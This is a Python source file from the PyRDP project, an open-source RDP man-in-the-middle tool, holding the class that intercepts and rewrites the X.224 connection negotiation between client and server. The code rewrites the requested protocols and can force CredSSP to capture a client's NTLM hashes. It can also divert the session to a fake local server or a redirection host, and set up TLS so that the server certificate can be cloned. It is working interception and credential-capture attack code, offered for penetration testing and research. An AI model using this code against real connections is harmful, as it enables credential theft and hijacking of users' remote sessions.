#
# This file is part of the PyRDP project.
# Copyright (C) 2019-2021 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from typing import Callable, Coroutine, Optional
from logging import LoggerAdapter

from pyrdp.core import defer
from pyrdp.enum import NegotiationFailureCode, NegotiationType, NegotiationRequestFlags, NegotiationProtocols
from pyrdp.layer import X224Layer
from pyrdp.mitm.state import RDPMITMState
from pyrdp.parser import NegotiationRequestParser, NegotiationResponseParser
from pyrdp.pdu import NegotiationRequestPDU, NegotiationResponsePDU, X224ConnectionConfirmPDU, X224ConnectionRequestPDU, \
    X224DisconnectRequestPDU, X224ErrorPDU, NegotiationFailurePDU


class X224MITM:
    def __init__(self, client: X224Layer, server: X224Layer, log: LoggerAdapter, state: RDPMITMState,
                 connector: Callable[[], Coroutine], disconnector: Callable[[], None],
                 startTLSCallback: Callable[[Callable[[], None]], None]):
        """

        :param client: X224 layer for the client side
        :param server: X224 layer for the server side
        :param log: logger for this component
        :param state: state of the MITM
        :param connector: function that connects to the server, called when a connection request is received
        :param disconnector: function that disconnects from the server, called when using a redirection host and NLA is enforced
        :param startTLSCallback: callback that should execute a startTLS on the client and server sides
        """

        super().__init__()
        self.client = client
        self.server = server
        self.log = log
        self.state = state
        self.connector = connector
        self.disconnector = disconnector
        self.startTLSCallback = startTLSCallback
        self.originalConnectionRequest: Optional[X224ConnectionRequestPDU] = None
        self.originalNegotiationRequest: Optional[NegotiationRequestPDU] = None

        self.client.createObserver(
            onConnectionRequest = self.onConnectionRequest,
            onDisconnectRequest = self.onClientDisconnectRequest,
            onError = self.onClientError
        )

        self.server.createObserver(
            onConnectionConfirm = self.onConnectionConfirm,
            onDisconnectRequest = self.onServerDisconnectRequest,
            onError=self.onServerError
        )

    def onConnectionRequest(self, pdu: X224ConnectionRequestPDU):
        """
        Log the connection cookie and handle connection protocols.
        :param pdu: the connection request
        """

        parser = NegotiationRequestParser()
        self.originalConnectionRequest = pdu
        self.originalNegotiationRequest = parser.parse(pdu.payload)
        self.state.requestedProtocols = self.originalNegotiationRequest.requestedProtocols

        # We assign clientIp here since this is fired before RDPMITM has the chance to update all loggers
        self.log.extra['clientIp'] = self.state.clientIp

        if self.originalNegotiationRequest.flags is not None and self.originalNegotiationRequest.flags & NegotiationRequestFlags.RESTRICTED_ADMIN_MODE_REQUIRED:
            self.log.warning("Client has enabled Restricted Admin Mode, which forces Network-Level Authentication (NLA)."
                             " Connection will fail.", {"restrictedAdminActivated": True})

        if self.originalNegotiationRequest.cookie:
            self.log.info("%(cookie)s", {"cookie": self.originalNegotiationRequest.cookie.decode()})
        else:
            self.log.info("No cookie for this connection")

        chosenProtocols = self.originalNegotiationRequest.requestedProtocols

        if chosenProtocols is not None:
            # Tell the server we only support the allowed authentication methods.
            chosenProtocols &= self.state.config.authMethods

        if self.state.ntlmCapture:
            # If we want to capture the NTLM hash, we need to put back CredSSP in here.
            # If we don't do that we will not get to the state where we can clone the certificate if needed.
            chosenProtocols = NegotiationProtocols.SSL | NegotiationProtocols.CRED_SSP

        modifiedRequest = NegotiationRequestPDU(
            self.originalNegotiationRequest.cookie,
            self.originalNegotiationRequest.flags,
            chosenProtocols,
            self.originalNegotiationRequest.correlationFlags,
            self.originalNegotiationRequest.correlationID,
        )

        payload = parser.write(modifiedRequest)
        defer(self.connectToServer(payload))

    async def connectToServer(self, payload: bytes):
        """
        Awaits the coroutine that connects to the server.
        :param payload: the connection request payload
        """

        await self.connector()
        self.server.sendConnectionRequest(payload = payload)

    def onConnectionConfirm(self, pdu: X224ConnectionConfirmPDU):
        """
        Execute a startTLS if the SSL protocol was selected.
        :param pdu: the connection confirm PDU
        """

        # FIXME: In case the server picks anything other than what we support, PyRDP is
        #        likely going to be unable to complete the handshake with the server.
        #        This should not happen since we are intercepting and spoofing the NEG_REQ,
        #        though.
        # protocols = NegotiationProtocols.SSL if self.originalRequest.tlsSupported else NegotiationProtocols.NONE

        parser = NegotiationResponseParser()
        response = parser.parse(pdu.payload)
        if isinstance(response, NegotiationFailurePDU):
            if response.failureCode == NegotiationFailureCode.HYBRID_REQUIRED_BY_SERVER:

                # Disconnect from current server
                self.disconnector()

                if self.state.config.fakeServer:
                    # Activate configuration
                    self.state.useFakeServer()
                    self.log.info("The server forces the use of NLA. Launched local RDP server on %(host)s:%(port)d", {
                        "host": self.state.effectiveTargetHost,
                        "port": self.state.effectiveTargetPort
                    })
                elif self.state.canRedirect():
                    self.log.info("The server forces the use of NLA. Using redirection host: %(redirectionHost)s:%(redirectionPort)d", {
                        "redirectionHost": self.state.config.redirectionHost,
                        "redirectionPort": self.state.config.redirectionPort
                    })

                    # Use redirection host and replay sequence starting from the connection request
                    self.state.useRedirectionHost()
                else:
                    # If we are not configured to redirect then we should capture the NTLM hash
                    self.log.info("Server requires CredSSP/NLA and we are not configured to support it. Attempting to capture client's NTLM hashes.")
                    self.state.ntlmCapture = True

                self.onConnectionRequest(self.originalConnectionRequest)
                return
            else:
                self.log.info("The server failed the negotiation. Error: %(error)s", {"error": NegotiationFailureCode.getMessage(response.failureCode)})
                payload = pdu.payload
        elif self.state.ntlmCapture:
            payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, NegotiationProtocols.CRED_SSP))
        else:
            payload = parser.write(NegotiationResponsePDU(NegotiationType.TYPE_RDP_NEG_RSP, 0x00, response.selectedProtocols))

        # FIXME: This should be done based on what authentication method the server selected, not on what
        #        the client supports.
        if self.originalNegotiationRequest.tlsSupported:
            # If a TLS tunnel is requested, then we establish the server-side tunnel before
            # replying to the client, so that we can clone the certificate if needed.
            self.startTLSCallback(lambda: self.client.sendConnectionConfirm(payload, source=0x1234))
            self.state.useTLS = True
        else:
            self.client.sendConnectionConfirm(payload, source=0x1234)

    def onClientDisconnectRequest(self, pdu: X224DisconnectRequestPDU):
        self.server.sendPDU(pdu)

    def onServerDisconnectRequest(self, pdu: X224DisconnectRequestPDU):
        self.client.sendPDU(pdu)

    def onClientError(self, pdu: X224ErrorPDU):
        self.log.warn("X224 PDU Client Error %(pdu)s", {"pdu": pdu})
        self.server.sendPDU(pdu)

    def onServerError(self, pdu: X224ErrorPDU):
        self.log.warn("X224 PDU Server Error %(pdu)s", {"pdu": pdu})
        self.client.sendPDU(pdu)
